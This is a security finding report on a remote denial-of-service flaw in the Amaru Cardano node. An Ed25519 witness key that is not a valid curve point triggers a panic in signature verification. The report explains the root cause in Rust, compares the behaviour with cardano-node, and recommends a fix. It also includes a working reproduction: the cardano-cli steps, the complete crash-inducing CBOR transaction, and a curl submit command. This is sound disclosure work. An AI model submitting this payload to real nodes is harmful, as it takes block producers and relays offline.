# Finding: Amaru node crash (DoS) on a verification-key witness whose key is a non-curve-point

**Severity: HIGH** (remote, unauthenticated, single-transaction node crash / liveness).
**Status: CONFIRMED, reproducible** (2/2) on a dedicated, mempool-isolated pair, 2026-09-27.
**Affected:** Amaru `v10.11.0+eaf8ac3f` (= v10.11.20260925). **Reference:** cardano-node 11.1.2
(`fef83fed`) handles the identical transaction gracefully and stays up.

## Summary

A single, structurally valid Conway transaction carrying a verification-key witness whose
32-byte `verification_key` is **not a valid Ed25519 curve point** (a canonical `y < p` value that
fails Edwards decompression) crashes the whole Amaru node. The `ledger` thread panics, the
process exits, and the submit API becomes unreachable. The transaction needs **no valid
signature and spends nothing of the attacker's** — the malformed key is an *extra* witness added
to an otherwise-valid, correctly-signed transaction, so it passes the required-signer check and
reaches signature verification, where the panic fires.

Discovered by the phase-1 mutation soak (`workload/phase1_soak.py`): a random byte mutation
produced a witness key that was well-sized but not a valid point, and Amaru went down mid-run.
This documents the root cause and a minimal, deterministic reproduction.

## Root cause (source, amaru `eaf8ac3f`)

`crates/amaru-kernel/src/cardano/verification_key_witness.rs`, `verify_ed25519_signature`:

```rust
#[expect(clippy::expect_used, reason = "witness sizes are guaranteed by transaction decoding")]
pub fn verify_ed25519_signature(verification_key, signature, message) -> Result<(), InvalidEd25519Signature> {
    let public_key = ed25519::VerifyingKey::try_from(verification_key.as_slice())
        .expect("key size is guaranteed by transaction decoding");   // <-- line 42: panics
    ...
}
```

The `.expect()` assumes the only failure mode of `VerifyingKey::try_from` is a wrong **size**, and
size is indeed fixed (`VerificationKey = FixedBytes<32>`, enforced at decode). But
`ed25519_dalek::VerifyingKey::try_from(&[u8])` **also decompresses the compressed Edwards point**
and returns `Err` when the 32 bytes are not a valid point — a condition decoding does *not*
guarantee. Roughly half of all 32-byte strings are non-decompressable, so this is trivially
reachable.

The caller (`crates/amaru-ledger/src/rules/transaction/phase_one/verification_key_witness.rs`,
line ~66) is written to handle bad signatures **gracefully** — it collects them via
`unwrap_or_else(|e| invalid_witnesses.push(...))` and returns `InvalidSignatures`. The `.expect()`
inside `verify_ed25519_signature` **bypasses that graceful path**: a malformed key panics instead
of being collected as an invalid witness. The same function has the identical pattern for the
signature parse (line ~45) and for bootstrap witnesses (line ~76).

## Why it reaches the vulnerable code

Phase-1 validation checks fees and required-signer presence *before* verifying signatures. The
reproduction therefore:
1. is a fully valid, correctly-signed self-send (fee 300000 >> min, value conserved), so the
   fee and required-signer checks pass; then
2. carries a **second** vkey witness with a non-curve-point key. The required signer is already
   covered by witness #0, so validation proceeds into the signature-verification loop, which
   iterates **all provided** witnesses and panics on witness #1.

(A first attempt that replaced the *only* witness's key was rejected gracefully as
`MissingRequiredKeysOrRoots` — changing the key changes its hash, so it is no longer a required
signer and the signature loop is never reached. The extra-witness construction is what reaches
the panic. Note also that `0xff*32` does **not** trigger it: dalek accepts it and fails at
`verify_strict` gracefully; the key must be a genuinely non-decompressable point such as
LE(`y=2`).)

## Evidence (dedicated controlled test — both nodes frozen at the rebake chain, fair)

- **Amaru `eaf8ac3f` (:3020):** `curl` exit 52 (connection dropped), process **gone**, API `000`.
  Log: `thread 'ledger' panicked at crates/amaru-kernel/src/cardano/verification_key_witness.rs:42:10:
  key size is guaranteed by transaction decoding: signature::Error {}`. Reproduced 2/2, plus the
  original soak occurrence.
- **cardano-node 11.1.2 (`fef83fed`, :8093):** rejects the identical tx gracefully —
  `ConwayUtxowFailure (InvalidWitnessesUTXOW (VKey (VerKeyEd25519DSIGN "0200...00")))` — and stays
  up (submit API still 400/alive).

Preserved evidence: `/home/nigel/sub3-outage-evidence/` (crash logs incl. the original soak
occurrence `amaru-sub3.1790469991.log`, and `repro-vkey-noncurve-point.tx`).

## Minimal reproduction

The non-curve-point key used is the little-endian encoding of `y = 2` (`0200…00`), which is
canonical (`y < p`) but fails Edwards decompression.

```
# 1. a valid self-send spending the funded UTxO, fee 300000, signed with fixture/funding/payment.skey
cardano-cli conway transaction build-raw --tx-in 9708b921…#0 --tx-out <addr>+<in-300000> --fee 300000 --out-file base.raw
cardano-cli conway transaction sign --tx-body-file base.raw --signing-key-file payment.skey --testnet-magic 42 --out-file base.tx
# 2. in base.tx's witness set, bump the vkey-witness array 0x81 -> 0x82 and append
#    [ 0x5820 <0200…00> , 0x5840 <any 64-byte sig> ]
# 3. submit the resulting tx to amaru's submit API -> node crashes
curl -X POST -H 'Content-Type: application/cbor' --data-binary @inject.cbor http://<amaru>:3011/api/submit/tx
```

Reproducing tx (302-byte CBOR):

```
84a300d90102818258209708b921e619b34a6fafc375ebd46bf65d77eed427f953eabed2b9da9212c4a100018182581d60e5a5ddb03fe37059627fede71458401e0dd97bb371b3bd7cce0d23271b0000b5e620efec20021a000493e0a100d901028282582016ca8eeb26ae9774130d27a8c6f166d7f8e3ca0f9cc79b349e5077774217daf8584040bea9684eef5dae56956581d5923194e8fec7df022de6163e7557462d7ed3f2bf5a58bf5045e9eb67b2f1a514749efc3dc21a57406adbb6685b524e35a93d008258200200000000000000000000000000000000000000000000000000000000000000584040bea9684eef5dae56956581d5923194e8fec7df022de6163e7557462d7ed3f2bf5a58bf5045e9eb67b2f1a514749efc3dc21a57406adbb6685b524e35a93d00f5f6
```

## Impact

Any peer that can submit a transaction — the submit API, or a relay via the node-to-node
tx-submission protocol — can crash the node with one message. No stake, no valid signature, and
no spend of the victim's funds are required. On a block producer this is a liveness/DoS risk. The
input is a normal, spec-shaped transaction; only the witness key bytes are malformed, so
size/fee/CBOR-shape filters do not stop it.

## Recommendation

Return the error instead of panicking: have `verify_ed25519_signature` map a failed
`VerifyingKey::try_from` (and `Signature::try_from`) to `InvalidEd25519Signature` (or a dedicated
`MalformedKey` variant), so the existing `unwrap_or_else` collection path reports it as an invalid
witness — matching cardano-node's `InvalidWitnessesUTXOW`. Remove the `#[expect(clippy::expect_used)]`
justification, which rests on the incorrect "size is the only failure" assumption. Audit the
sibling `.expect()` on the signature parse and the bootstrap-witness loop for the same issue.

## Relation to prior findings

Same class as [finding-amaru-noncanonical-cbor-crash.md](finding-amaru-noncanonical-cbor-crash.md):
a malformed-but-decodeable input panics instead of being rejected gracefully. Distinct trigger
(witness key point-validity vs. CBOR canonicity) and distinct code path (ed25519 key parse in
the phase-1 witness rule).
